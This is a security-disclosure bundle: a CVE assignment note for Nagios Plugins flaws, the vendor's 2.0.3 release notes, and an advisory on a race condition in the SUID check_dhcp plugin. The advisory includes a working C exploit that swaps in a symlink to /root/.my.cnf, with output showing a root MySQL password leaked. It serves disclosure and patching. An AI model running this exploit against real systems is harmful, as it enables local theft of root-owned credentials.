-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

This is a somewhat unusual situation for CVE because there are two
cases in which a researcher reported a subset of the problem, and then
a vendor fix was announced that apparently addressed the problem
without modifying the component mentioned by the researcher.

> <http://seclists.org/fulldisclosure/2014/May/74>
>
> This was fixed in version 2.0.2:
>
> <<http://nagios-plugins.org/nagios-plugins-2-0-2-released/>>

Use CVE-2014-4701 for the report in
<http://seclists.org/fulldisclosure/2014/May/74> stating that check_dhcp
is affected. (<http://nagios-plugins.org/nagios-plugins-2-0-2-released/>
is also an applicable reference for this CVE.)

Use CVE-2014-4702 for the report in
<http://nagios-plugins.org/nagios-plugins-2-0-2-released/> stating that
check_icmp is affected. This is new vector information announced at a
different time by a different party.

(From a practical perspective, someone might have been tracking Nagios
Plugins security on the basis of fulldisclosure posts, and decided to
"fix" <http://seclists.org/fulldisclosure/2014/May/74> by simply
deleting the check_dhcp plugin. In this case, CVE-2014-4702 is useful
because that installation was still vulnerable after that
CVE-2014-4701 remediation action.)

> <http://seclists.org/fulldisclosure/2014/Jun/141>
>
> This was fixed in version 2.0.3:
>
> <<http://nagios-plugins.org/nagios-plugins-2-0-3-released/>>

Use CVE-2014-4703 for the report in
<http://seclists.org/fulldisclosure/2014/Jun/141> stating that
check_dhcp is affected.
(<http://nagios-plugins.org/nagios-plugins-2-0-3-released/> is also an
applicable reference for this CVE.)

Here, the vendor did not announce any additional vector information
(and only referred to "the SUID vulnerability discovered by David
Golunski") so we can't assign a fourth CVE ID for the
<http://nagios-plugins.org/nagios-plugins-2-0-3-released/> post. It's
possible that this is actually a parallel situation, so if anyone
wants to announce an issue in 2.0.2 that's not specifically about
check_dhcp, an additional CVE ID could be assigned.

# Nagios Plugins 2.0.3 Released

The Nagios Plugins Development Team is proud to announce that [nagios-plugins 2.0.3](http://nagios-plugins.org/downloads/?utm_source=nagios-plugins.org&utm_medium=post&utm_content=Nagios%20Plugins%202.0.3%20Released&utm_campaign=Nagios%20Plugins "download nagios-plugins 2.0.3") has been released and is available for [download](http://nagios-plugins.org/downloads/?utm_source=nagios-plugins.org&utm_medium=post&utm_content=Nagios%20Plugins%202.0.3%20Released&utm_campaign=Nagios%20Plugins "download nagios-plugins 2.0.3").

This release is mostly small bug fixes and additional protections against the SUID vulnerability discovered by Dawid Golunski. As we are now using coverity to scan for small bugs, there will be a number of small commits in the near future.

The mailq autodetection commits were reverted as there were issues with parsing performed by the awk script. We decided to use FindBin in lieu of shimming the awk regex. You can try out the proposed FindBin changes in the branch “findbin”.  Expect the branches [findbin](https://github.com/nagios-plugins/nagios-plugins/tree/findbin "View the findbin branch at the nagios-plugins GitHub") and [timeout\_state](https://github.com/nagios-plugins/nagios-plugins/tree/timeout_state "View the timeout_state branch at the nagios-plugins GitHub") to be merged into the next major release (2.1.0).

A full list of included enhancements and fixes are listed below:

**SECURITY FIXES**

* parse\_ini.c – Additional fixes for the SUID plugins vulnerabilities (sreinhardt)
* Added Gnulib module idpriv-droptemp (weiss)

**FIXES**

* check\_dns.c – Resolved issues with reverse lookup (sreinhardt)
* check\_dns.c – Changed query types from ALL to ANY (sreinhardt)
* common.h – Include fixes for esoteric AIX compile issues (emislivec)
* negate.c – Small fixes from coverity (66479) (66480) (sreinhardt)
* check\_dhcp.c – Small fix from coverity (66488) (sreinhardt)
* check\_http.c – Potential memory leak and overflow fixed from coverity (66514) (sreinhardt)
* check\_ntp.c – Small fix from coverity (66524) (sreinhardt)
* utils\_cmd.c – Small file descriptor fix from coverity (66502) (sreinhardt)
* check\_apt.c – Small fix for from coverity (66531) (sreinhardt)

**REVERTS**

* check\_mailq – Reverted autodetection commits to avoid awk parsing issues. Autodetection will return in version 2.1.0 as part of the changes in the FindBin branch (abrist)

# check\_dhcp - Nagios Plugins = 2.0.2 Race Condition

---

*From*: Dawid Golunski <golunski.dawid () gmail com>

*Date*: Sat, 28 Jun 2014 00:32:21 +0100

```
=============================================
- Release date: 28.06.2014
- Discovered by: Dawid Golunski
- Severity: Moderate
=============================================

I. VULNERABILITY
-------------------------

check_dhcp - Nagios Plugins = 2.0.2 Race Condition

II. BACKGROUND
-------------------------

"Nagios is an open source computer system monitoring, network monitoring and
infrastructure monitoring software application. Nagios offers monitoring and
alerting services for servers, switches, applications, and services.
It alerts the users when things go wrong and alerts them a second time when
the problem has been resolved.

Nagios Plugins (Official)

The Nagios Plugins Development Team maintains a bundle of more than fifty
standard plugins for Nagios and other monitoring applications that use the
straightforward plugin interface originally invented by the Nagios folks.
Each plugin is a stand-alone command line tool that provides a specific type
of check. Typically, your monitoring software runs these plugins to determine
the current status of hosts and services on your network.

Some of the provided plugins let you check local system metrics (such as load
averages, processes, or disk space usage), others use various network protocols
(such as ICMP, SNMP, or HTTP) to perform remote checks.
This allows for checking a large number of common host and service types.

* check_dhcp plugin

This plugin tests the availability of DHCP servers on a network."

III. INTRODUCTION
-------------------------

check_dhcp plugin (part of the official Nagios Plugins package) contained
a vulnerability that allowed a malicious attacker to read parts of INI
config files belonging to root on a local system. It allowed an attacker
to obtain sensitive information like passwords that should only be accessible
by root user.

This vulnerability was discussed in my previous advisory available at:

<http://legalhackers.com/advisories/nagios-check_dhcp.txt>
<http://www.exploit-db.com/exploits/33387/>

The vulnerability was quickly patched by vendor in the release of nagios plugins
version 2.0.2 however the security measures in the patch are not sufficient and
the code is vulnerable to Race Condition attack.
Race Condition makes it possible for an arbitrary user to read parts of a
root-owned file despite the checks.

IV. DESCRIPTION
-------------------------

Nagios Plugins 2.0.2 introduces the following checks before the SUID
root check_dhcp
program accesses a file provided by a user:

-----[ lib/parse_ini.c ]-----

/* We must be able to stat() the thing. */
if (lstat(i.file, &fstat) != 0)
       die(STATE_UNKNOWN, "%s %s\n", _("Can't read config file."),
strerror(errno));
/* The requested file must be a regular file. */
if (!S_ISREG(fstat.st_mode))
       die(STATE_UNKNOWN, "%s\n", _("Can't read config file. Requested
path is not a regular file."));
/* We must be able to read the requested file. */
if (access(i.file, R_OK|F_OK) != 0)
       die(STATE_UNKNOWN, "%s %s\n", _("Can't read config file."),
strerror(errno));

/* We need to successfully open the file for reading... */
if ((inifile=fopen(i.file, "r")) == NULL)
       die(STATE_UNKNOWN, "%s %s\n", _("Can't read config file."),
strerror(errno));

------------------------------

A configfile will only be opened if it is a regular file (not a
symlink) and only if it
is readable by the real user running the program (checked with access() call).

These checks prevent a user from accessing a file that is not owned by them e.g:

$ /usr/local/nagios/libexec/check_dhcp -v --extra-opts=mysql@/root/.my.cnf
Can't read config file. Permission denied

However there's a possibility of a Race Condition here. If an attacker manages
to create a symlink leading to /root/.my.cnf in the very short time window that
occurs between the regular file/permission checks and the fopen() call then the
attacker could still be successful in obtaining the contents of the file.

V. PROOF OF CONCEPT
-------------------------

Below is an example exploit that demonstrates this attack.

-------[ checkdhcp_race_exploit.c ]-------

/* check_dhcp 2.0.2 Arbitrary Option File Read - Race Condition Exploit */
/* Created by Dawid Golunski (dawid () legalhackers com) */
/* <http://legalhackers.com> */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#define TARGET         "/usr/local/nagios/libexec/check_dhcp"
#define PROGARGS       "--extra-opts=mysql@/tmp/access"
#define ROOT_CONFIG    "/root/.my.cnf"
#define SYMLINK_FILE   "/tmp/access"

#define MAX_DELAY 1500  // adjust if necessary

int main(int argc,char **argv)
{
   char *arg[] = {TARGET, PROGARGS, 0};
   int randomnum = 0;

   /* Create empty file , remove if already exists */
   unlink(SYMLINK_FILE);
   open(SYMLINK_FILE, O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);

   if(fork() == (pid_t)0){
   /* Child Proc */
       execvp(TARGET, arg);
   }
   else{
   /* Parent Proc */
       srand ( time(NULL) );
       randomnum = ( rand() % MAX_DELAY );

       usleep(randomnum);
       unlink(SYMLINK_FILE);   /* Unlink the file */
       symlink(ROOT_CONFIG, SYMLINK_FILE);  /* Create symlink */

       wait(NULL);
   }

return 0;
}

-------------------------

Here is an example root mysql config file:

# cat /root/.my.cnf
[mysqldump]
quick

[mysql]
# saved password for the mysql root user
password=myRootSecretMysqlPass123

Here is the output of the running exploit:

$ while :; do ./checkdhcp_race_exploit; done

Invalid section 'mysql' in config file '/tmp/access'
Can't read config file. Requested path is not a regular file.
Can't read config file. Requested path is not a regular file.
Can't read config file. No such file or directory
Can't read config file. Requested path is not a regular file.
Can't read config file. No such file or directory
Can't read config file. No such file or directory
Can't read config file. Requested path is not a regular file.
Can't read config file. Requested path is not a regular file.
Can't read config file. No such file or directory
/usr/local/nagios/libexec/check_dhcp: unrecognized option
'--password=myRootSecretMysqlPass123'
Usage:
check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout]
                 [-i interface] [-m mac]
Invalid section 'mysql' in config file '/tmp/access'
Invalid section 'mysql' in config file '/tmp/access'
Invalid section 'mysql' in config file '/tmp/access'

As we can see it succeeds after some failed runs.

VI. BUSINESS IMPACT
-------------------------

Malicious user that has local access to a system where check_dhcp plugin is
installed with SUID could exploit  this vulnerability to read any INI format
config files owned by root and  potentially extract some sensitive information.

VII. SYSTEMS AFFECTED
-------------------------

Systems with check_dhcp SUID binary installed as a part of Nagios
Plugins 2.0.2 are vulnerable.

VIII. SOLUTION
-------------------------

Vendor has been informed about the vulnerability prior to the release
of this advisory and
released another version of nagios plugins available at:
<http://nagios-plugins.org/nagios-plugins-2-0-3-released/>
